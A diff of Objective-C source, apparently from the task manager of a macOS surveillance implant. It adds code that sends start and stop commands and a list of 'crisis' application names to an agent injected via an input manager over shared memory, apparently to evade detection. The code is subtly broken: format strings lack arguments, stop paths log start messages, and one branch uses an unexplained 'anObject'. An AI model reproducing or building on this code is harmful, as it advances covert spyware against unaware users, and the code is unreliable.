@@ -1266,14 +1266,84 @@ static NSLock *gSyncLock                  = nil;
     case AGENT_CRISIS:
       {
 #ifdef DEBUG_TASK_MANAGER
-        NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
+        infoLog(@"%s: Starting Agent Crisis");
 #endif
         gAgentCrisis |= CRISIS_START;
 
         RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
         [infoManager logActionWithDescription: @"Crisis started"];
         [infoManager release];
-
+        
+        // Only for input manager
+        if (gOSMajor    == 10
+            && gOSMinor == 5)
+        {
+          if (gAgentCrisisApp == nil)
+            break;
+          
+          agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+          agentConfiguration = [[self getConfigForAgent: agentID] retain];
+          
+          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+          
+          shMemoryHeader->agentID = agentID;          
+          shMemoryHeader->direction = D_TO_AGENT;
+          shMemoryHeader->command = AG_START;
+          
+          memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
+          
+          NSMutableData *tmpArray = [[NSMutableData alloc] initWithCapacity: 0];
+          
+          UInt32 tmpNum = [gAgentCrisisApp count];
+          
+          [tmpArray appendBytes: &tmpNum length: sizeof(UInt32)];
+          
+          int tmpLen = sizeof(shMemoryHeader->commandData);
+          
+          unichar padZero=0;
+          NSData *tmpPadData = [[NSData alloc] initWithBytes: &padZero length:sizeof(unichar)];
+          
+          for (int i=0; i < [gAgentCrisisApp count]; i++)
+          {
+            NSString *tmpString = (NSString*)[gAgentCrisisApp objectAtIndex: i];
+            
+            tmpLen -= [tmpString lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] + sizeof(unichar);
+            
+            if (tmpLen > 0)
+            {
+              [tmpArray appendData: [tmpString dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
+              [tmpArray appendData: tmpPadData];
+            }
+          }
+          
+          [tmpPadData release];
+          
+          shMemoryHeader->commandDataSize = [tmpArray length];
+          memcpy(shMemoryHeader->commandData, [tmpArray bytes], shMemoryHeader->commandDataSize);
+          
+          if ([gSharedMemoryCommand writeMemory: agentCommand
+                                         offset: OFFT_CRISIS
+                                  fromComponent: COMP_CORE] == TRUE)
+          {
+            [agentConfiguration setObject: AGENT_RUNNING
+                                   forKey: @"status"];
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Start command sent to Agent CRISIS", agentID);
+#endif
+          }
+          else
+          {
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"An error occurred while starting agent CRISIS");
+#endif
+            [tmpArray release];
+            [agentCommand release];
+            [agentConfiguration release];
+            return NO;
+          }
+          
+          [tmpArray release];
+        }
         break;
       }
     default:
@@ -1674,13 +1744,50 @@ static NSLock *gSyncLock                  = nil;
     case AGENT_CRISIS:
       {
 #ifdef DEBUG_TASK_MANAGER
-        NSLog(@"%s: Stopping Agent Crisis", __FUNCTION__);
+        infoLog(@"%s: Stopping Agent Crisis");
 #endif
         gAgentCrisis &= ~CRISIS_STARTSTOP;
 
         RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
         [infoManager logActionWithDescription: @"Crisis stopped"];
         [infoManager release];
+        
+        // Only for input manager
+        if (gOSMajor    == 10
+            && gOSMinor == 5)
+        {
+          agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+          agentConfiguration = [[self getConfigForAgent: agentID] retain];
+          
+          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+          
+          shMemoryHeader->agentID = agentID;          
+          shMemoryHeader->direction = D_TO_AGENT;
+          shMemoryHeader->command = AG_STOP;
+          memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
+          
+          shMemoryHeader->commandDataSize = 0;
+          
+          if ([gSharedMemoryCommand writeMemory: agentCommand
+                                         offset: OFFT_CRISIS
+                                  fromComponent: COMP_CORE] == TRUE)
+          {
+            [agentConfiguration setObject: AGENT_STOPPED
+                                   forKey: @"status"];
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Start command sent to Agent CRISIS", agentID);
+#endif
+          }
+          else
+          {
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"An error occurred while starting agent CRISIS");
+#endif
+            [agentCommand release];
+            [agentConfiguration release];
+            return NO;
+          }
+        }
 
         break;
       }
@@ -2334,13 +2441,84 @@ static NSLock *gSyncLock                  = nil;
             case AGENT_CRISIS:
               {
 #ifdef DEBUG_TASK_MANAGER
-                NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
+                infoLog(@"%s: Starting Agent Crisis");
 #endif
                 gAgentCrisis |= CRISIS_START;                
 
                 RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
                 [infoManager logActionWithDescription: @"Crisis starting"];
                 [infoManager release];
+                
+                // Only for input manager
+                if (gOSMajor    == 10
+                    && gOSMinor == 5)
+                {
+                  if (gAgentCrisisApp == nil)
+                    break;
+                  
+                  agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+                  agentConfiguration = [[self getConfigForAgent: agentID] retain];
+                  
+                  shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+                  
+                  shMemoryHeader->agentID = agentID;          
+                  shMemoryHeader->direction = D_TO_AGENT;
+                  shMemoryHeader->command = AG_START;
+                  
+                  memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
+                  
+                  NSMutableData *tmpArray = [[NSMutableData alloc] initWithCapacity: 0];
+                  
+                  UInt32 tmpNum = [gAgentCrisisApp count];
+                  
+                  [tmpArray appendBytes: &tmpNum length: sizeof(UInt32)];
+                  
+                  int tmpLen = sizeof(shMemoryHeader->commandData);
+                  
+                  unichar padZero=0;
+                  NSData *tmpPadData = [[NSData alloc] initWithBytes: &padZero length:sizeof(unichar)];
+                  
+                  for (int i=0; i < [gAgentCrisisApp count]; i++)
+                  {
+                    NSString *tmpString = (NSString*)[gAgentCrisisApp objectAtIndex: i];
+                    
+                    tmpLen -= [tmpString lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] + sizeof(unichar);
+                    
+                    if (tmpLen > 0)
+                    {
+                      [tmpArray appendData: [tmpString dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
+                      [tmpArray appendData: tmpPadData];
+                    }
+                  }
+                  
+                  [tmpPadData release];
+                  
+                  shMemoryHeader->commandDataSize = [tmpArray length];
+                  memcpy(shMemoryHeader->commandData, [tmpArray bytes], shMemoryHeader->commandDataSize);
+                  
+                  if ([gSharedMemoryCommand writeMemory: agentCommand
+                                                 offset: OFFT_CRISIS
+                                          fromComponent: COMP_CORE] == TRUE)
+                  {
+                    [agentConfiguration setObject: AGENT_RUNNING
+                                           forKey: @"status"];
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Start command sent to Agent CRISIS", agentID);
+#endif
+                  }
+                  else
+                  {
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"An error occurred while starting agent CRISIS");
+#endif
+                    [tmpArray release];
+                    [agentCommand release];
+                    [agentConfiguration release];
+                    return NO;
+                  }
+                  
+                  [tmpArray release];
+                }
 
                 break;
               }
@@ -2709,14 +2887,49 @@ static NSLock *gSyncLock                  = nil;
             case AGENT_CRISIS:
               {
 #ifdef DEBUG_TASK_MANAGER
-                NSLog(@"%s: Stopping Agent Crisis", __FUNCTION__);
+                infoLog(@"%s: Stopping Agent Crisis");
 #endif
                 gAgentCrisis &= ~CRISIS_STARTSTOP;
 
                 RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
                 [infoManager logActionWithDescription: @"Crisis stopped"];
                 [infoManager release];
-
+                
+                // Only for input manager
+                if (gOSMajor    == 10
+                    && gOSMinor == 5)
+                {
+                   NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+                  
+                  shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+                  
+                  shMemoryHeader->agentID = agentID;          
+                  shMemoryHeader->direction = D_TO_AGENT;
+                  shMemoryHeader->command = AG_STOP;
+                  memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
+                  
+                  shMemoryHeader->commandDataSize = 0;
+                  
+                  if ([gSharedMemoryCommand writeMemory: agentCommand
+                                                 offset: OFFT_CRISIS
+                                          fromComponent: COMP_CORE] == TRUE)
+                  {
+                    [anObject setObject: AGENT_STOPPED
+                                forKey: @"status"];
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Start command sent to Agent CRISIS", agentID);
+#endif
+                  }
+                  else
+                  {
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"An error occurred while starting agent CRISIS");
+#endif
+                    [agentCommand release];
+                    return NO;
+                  }
+                }
+                
                 break;
               }
             default:
